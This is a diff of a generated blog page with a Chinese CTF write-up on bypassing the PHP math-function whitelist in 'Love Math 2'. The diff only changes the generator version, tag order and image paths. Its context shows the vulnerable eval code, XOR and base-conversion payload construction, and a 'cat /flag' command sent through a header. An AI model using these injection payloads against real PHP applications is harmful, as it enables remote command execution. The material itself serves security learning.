@@ -46,7 +46,7 @@ if(!isset($_GET[&#39;c&#39;]))&amp;#123;
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -521,12 +521,12 @@ if(!isset($_GET[&#39;c&#39;]))&amp;#123;
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -568,7 +568,7 @@ if(!isset($_GET[&#39;c&#39;]))&amp;#123;
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    931
+                    933
                 </div>
                 
 
@@ -622,7 +622,7 @@ if(!isset($_GET[&#39;c&#39;]))&amp;#123;
     <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法1-异或-取反"><a href="#方法1-异或-取反" class="headerlink" title="方法1 异或/取反"></a>方法1 异或/取反</h3><p>白名单制，给了很多数学函数，思路类似于构造所以可以考虑用这些数学函数通过<strong>异或</strong>/<strong>取反</strong>来构造成想要的字符。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法1-异或-x2F-取反"><a href="#方法1-异或-x2F-取反" class="headerlink" title="方法1 异或&#x2F;取反"></a>方法1 异或&#x2F;取反</h3><p>白名单制，给了很多数学函数，思路类似于构造所以可以考虑用这些数学函数通过<strong>异或</strong>&#x2F;<strong>取反</strong>来构造成想要的字符。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -656,7 +656,7 @@ if(!isset($_GET[&#39;c&#39;]))&amp;#123;
 <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
 <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo is_nan^'64';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20210902185216015.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20210902185216015.png"></p>
 <p>需要字符串异或才行，所以将数字以括号分割。</p>
 <h3 id="方法2-进制转换"><a href="#方法2-进制转换" class="headerlink" title="方法2 进制转换"></a>方法2 进制转换</h3><p>利用进制间的转换，使用<code>hex2bin()</code>函数，<code>hex2bin()</code>函数把十六进制值的字符串转换为 <strong>ASCII</strong>字符。</p>
 <p>1.首先将<code>hex2bin</code>转换为<strong>十进制</strong>：<code>base_convert(&#39;hex2bin&#39;,36,10);</code>，得到<code>37907361743</code>。注意这里是36-&gt;10。</p>
@@ -694,7 +694,7 @@ abs<span class="token operator">=</span>cat <span class="token operator">/</span
 <p>抓包，添加请求头信息</p>
 <pre class="line-numbers language-none"><code class="language-none">1: cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20211102201959037.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20211102201959037.png"></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111868053">https://blog.csdn.net/weixin_44037296/article/details/111868053</a></p>
 
                 
@@ -760,12 +760,12 @@ abs<span class="token operator">=</span>cat <span class="token operator">/</span
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -1119,12 +1119,12 @@ abs<span class="token operator">=</span>cat <span class="token operator">/</span
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -1172,12 +1172,12 @@ abs<span class="token operator">=</span>cat <span class="token operator">/</span
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
